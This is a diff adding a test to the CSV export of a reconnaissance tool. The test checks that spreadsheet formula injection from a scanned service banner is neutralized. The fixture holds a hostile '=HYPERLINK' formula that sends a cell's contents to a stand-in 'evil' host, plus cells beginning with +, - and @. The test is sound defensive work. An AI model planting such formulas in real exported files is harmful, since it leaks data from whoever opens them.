@@ -93,6 +93,16 @@ group("recon: targets — export", () => {
     assert.equal(lines[0], "host,port,service,banner");
     assert.ok(lines[2].includes('"nginx, ""v1"""'));
   });
+  test("CSV neutralizes spreadsheet formula injection from a hostile banner", () => {
+    const hostile = [{ host: "h1", port: 80, service: "http", banner: '=HYPERLINK("http://evil/"&A1,"x")' }];
+    const csv = T.resultsToCsv(hostile);
+    const cell = csv.split("\n")[1]; // the one data row
+    assert.ok(!/(^|,)=/.test(cell), "a cell must not begin with = (formula)");
+    assert.ok(cell.includes("'=HYPERLINK"), "the formula must be quote-prefixed");
+    // +, -, @ leads are also neutralized
+    assert.ok(T.resultsToCsv([{ host: "+1", port: 1, service: "@cmd", banner: "-2+3" }])
+      .split("\n")[1].split(",").every((c) => !/^[=+\-@]/.test(c.replace(/^"/, ""))));
+  });
   test("JSON export is valid and carries results + open count", () => {
     const obj = JSON.parse(T.resultsToJson(rows, { target: "h1" }));
     assert.equal(obj.open, 2);
